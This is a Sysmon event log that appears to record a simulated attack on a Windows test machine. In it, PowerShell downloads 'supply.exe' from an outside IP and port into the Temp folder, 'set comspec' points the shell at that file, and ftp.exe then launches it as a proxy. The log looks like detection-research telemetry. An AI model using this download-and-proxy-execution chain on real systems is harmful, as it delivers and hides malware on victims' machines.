{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:42.575"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1532,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:42.934820Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:42.577"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1533,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:42.937268Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"Image":"C:\\Windows\\system32\\svchost.exe","ProcessGuid":"747F3D96-89A1-6095-1300-000000001D00","ProcessId":956,"QueryName":"storage.googleapis.com","QueryResults":"2404:6800:4007:802::2010;2404:6800:4007:803::2010;2404:6800:4007:809::2010;2404:6800:4007:80a::2010;::ffff:172.217.26.176;::ffff:172.217.167.144;::ffff:172.217.31.208;::ffff:172.217.160.144;::ffff:216.58.196.176;::ffff:142.250.71.16;::ffff:142.250.71.48;::ffff:142.250.76.48;::ffff:142.250.195.48;::ffff:142.250.195.80;::ffff:142.250.195.112;::ffff:142.250.195.144;::ffff:142.250.195.176;::ffff:142.250.195.208;::ffff:142.250.195.240;::ffff:142.250.196.16;","QueryStatus":"0","RuleName":"-","UtcTime":"2021-05-07 12:20:43.020"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":22,"EventRecordID":1534,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":3364}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":22,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:20:43.950861Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"powershell  -c INvoke-WebRequest -Uri http://192.168.1.11:6969/supply.exe -OutFile C:\\Windows\\Temp\\supply.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows PowerShell","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=83767E18DB29B51A804A9E312D0ED99C,SHA256=1EE3D7C80D075D64F97D04D036E558043F2F6BC959C87CD5B0A6D53B96B96A0F,IMPHASH=D1A922C94A1F407CB2BBCAD033C8ED7A","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"PowerShell.EXE","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-3099-6095-D204-000000001D00","ParentProcessId":6844,"ProcessGuid":"747F3D96-30CC-6095-D804-000000001D00","ProcessId":6772,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:21:32.998"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1535,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:21:33.000963Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:21:33.166","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"747F3D96-30CC-6095-D804-000000001D00","ProcessId":6772,"RuleName":"-","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fk4fag3t.qiy.ps1","UtcTime":"2021-05-07 12:21:33.166"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1536,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:21:33.184792Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 11:39:36.562","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessGuid":"747F3D96-30CC-6095-D804-000000001D00","ProcessId":6772,"RuleName":"EXE","TargetFilename":"C:\\Windows\\Temp\\supply.exe","UtcTime":"2021-05-07 12:21:35.182"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1537,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:21:35.188183Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"DestinationHostname":"-","DestinationIp":"192.168.1.11","DestinationIsIpv6":false,"DestinationPort":6969,"DestinationPortName":"-","Image":"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe","Initiated":true,"ProcessGuid":"747F3D96-30CC-6095-D804-000000001D00","ProcessId":6772,"Protocol":"tcp","RuleName":"-","SourceHostname":"MSEDGEWIN10.domain.name","SourceIp":"192.168.1.8","SourceIsIpv6":false,"SourcePort":50594,"SourcePortName":"-","User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:21:35.152"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":3,"EventRecordID":1538,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":4216}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":3,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:21:36.270141Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"cmd  \\c set comspec=C:\\windows\\temp\\supply.exe","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"Windows Command Processor","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Hashes":"MD5=DB126FF10E71753C0C29210C090927A3,SHA256=B94D1C553C7EF81DF040D6BE59120EB0A8F67AEC1A787A2B6B537309CBAF8CC4,IMPHASH=392B4D61B1D1DADC1F06444DF258188A","Image":"C:\\Windows\\SysWOW64\\cmd.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"Cmd.Exe","ParentCommandLine":"C:\\Windows\\system32\\cmd.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-3AED-6095-D306-000000001D00","ParentProcessId":9572,"ProcessGuid":"747F3D96-3CC7-6095-E606-000000001D00","ProcessId":8072,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:21:43.851"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":3012,"Execution":{"#attributes":{"ProcessID":9324,"ThreadID":6456}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:21:43.270141Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"ftp","Company":"Microsoft Corporation","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"File Transfer Program","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Hashes":"MD5=F0707986208091066AFD2AB0A73D1693,SHA256=BE279F10D7FF4C18D69724EF0EB04C91D8A34AAC0DB610E638B000991DFB8B02,IMPHASH=F76AC455BB3971C0CB2A43FDCD1FF525","Image":"C:\\Windows\\SysWOW64\\ftp.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"ftp.exe","ParentCommandLine":"cmd  \\c set comspec=C:\\windows\\temp\\supply.exe","ParentImage":"C:\\Windows\\SysWOW64\\cmd.exe","ParentProcessGuid":"747F3D96-3099-6095-D204-000000001D00","ParentProcessId":6844,"ProcessGuid":"747F3D96-310F-6095-DB04-000000001D00","ProcessId":6120,"Product":"Microsoft\u00ae Windows\u00ae Operating System","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:22:39.500"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1539,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:39.505449Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"ftp","ParentImage":"C:\\Windows\\SysWOW64\\ftp.exe","ParentProcessGuid":"747F3D96-310F-6095-DB04-000000001D00","ParentProcessId":6120,"ProcessGuid":"747F3D96-3111-6095-DC04-000000001D00","ProcessId":5392,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:22:41.144"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1540,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.198493Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.224","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DC04-000000001D00","ProcessId":5392,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI53922\\msvcm90.dll","UtcTime":"2021-05-07 12:22:41.224"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1541,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.239351Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.224","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DC04-000000001D00","ProcessId":5392,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI53922\\msvcp90.dll","UtcTime":"2021-05-07 12:22:41.224"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1542,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.239376Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.239","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DC04-000000001D00","ProcessId":5392,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI53922\\msvcr90.dll","UtcTime":"2021-05-07 12:22:41.239"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1543,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.242872Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.254","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DC04-000000001D00","ProcessId":5392,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI53922\\python27.dll","UtcTime":"2021-05-07 12:22:41.254"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1544,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.259983Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3111-6095-DC04-000000001D00","ParentProcessId":5392,"ProcessGuid":"747F3D96-3111-6095-DD04-000000001D00","ProcessId":6796,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:22:41.272"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1545,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.273529Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"ipconfig\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3111-6095-DD04-000000001D00","ParentProcessId":6796,"ProcessGuid":"747F3D96-3111-6095-DE04-000000001D00","ProcessId":6708,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:22:41.525"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1546,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.528185Z"}},"Version":5}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.552","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DE04-000000001D00","ProcessId":6708,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI67082\\msvcm90.dll","UtcTime":"2021-05-07 12:22:41.552"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1547,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.566300Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.552","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DE04-000000001D00","ProcessId":6708,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI67082\\msvcp90.dll","UtcTime":"2021-05-07 12:22:41.552"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1548,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.566325Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.552","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DE04-000000001D00","ProcessId":6708,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI67082\\msvcr90.dll","UtcTime":"2021-05-07 12:22:41.552"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1549,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.566348Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CreationUtcTime":"2021-05-07 12:22:41.567","Image":"C:\\windows\\temp\\supply.exe","ProcessGuid":"747F3D96-3111-6095-DE04-000000001D00","ProcessId":6708,"RuleName":"DLL","TargetFilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\_MEI67082\\python27.dll","UtcTime":"2021-05-07 12:22:41.567"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":11,"EventRecordID":1550,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":11,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.582066Z"}},"Version":2}}
{"#attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"EventData":{"CommandLine":"C:\\windows\\temp\\supply.exe /c \"ipconfig\"\n","Company":"-","CurrentDirectory":"C:\\Users\\IEUser\\Downloads\\","Description":"-","FileVersion":"-","Hashes":"MD5=E253708011D4153D7764EC1B3CBC019F,SHA256=B896CC820879C983970829D81667BB69DA2567E942E9228AB68D64EDF550A77A,IMPHASH=4DF47BD79D7FE79953651A03293F0E8F","Image":"C:\\Windows\\Temp\\supply.exe","IntegrityLevel":"Medium","LogonGuid":"747F3D96-DE82-6094-7713-0F0000000000","LogonId":"0xf1377","OriginalFileName":"-","ParentCommandLine":"C:\\windows\\temp\\supply.exe /c \"ipconfig\"\n","ParentImage":"C:\\Windows\\Temp\\supply.exe","ParentProcessGuid":"747F3D96-3111-6095-DE04-000000001D00","ParentProcessId":6708,"ProcessGuid":"747F3D96-3111-6095-DF04-000000001D00","ProcessId":6096,"Product":"-","RuleName":"-","TerminalSessionId":1,"User":"MSEDGEWIN10\\IEUser","UtcTime":"2021-05-07 12:22:41.594"},"System":{"Channel":"Microsoft-Windows-Sysmon/Operational","Computer":"MSEDGEWIN10","Correlation":null,"EventID":1,"EventRecordID":1551,"Execution":{"#attributes":{"ProcessID":4224,"ThreadID":7088}},"Keywords":"0x8000000000000000","Level":4,"Opcode":0,"Provider":{"#attributes":{"Guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9","Name":"Microsoft-Windows-Sysmon"}},"Security":{"#attributes":{"UserID":"S-1-5-18"}},"Task":1,"TimeCreated":{"#attributes":{"SystemTime":"2021-05-07T12:22:41.595487Z"}},"Version":5}}
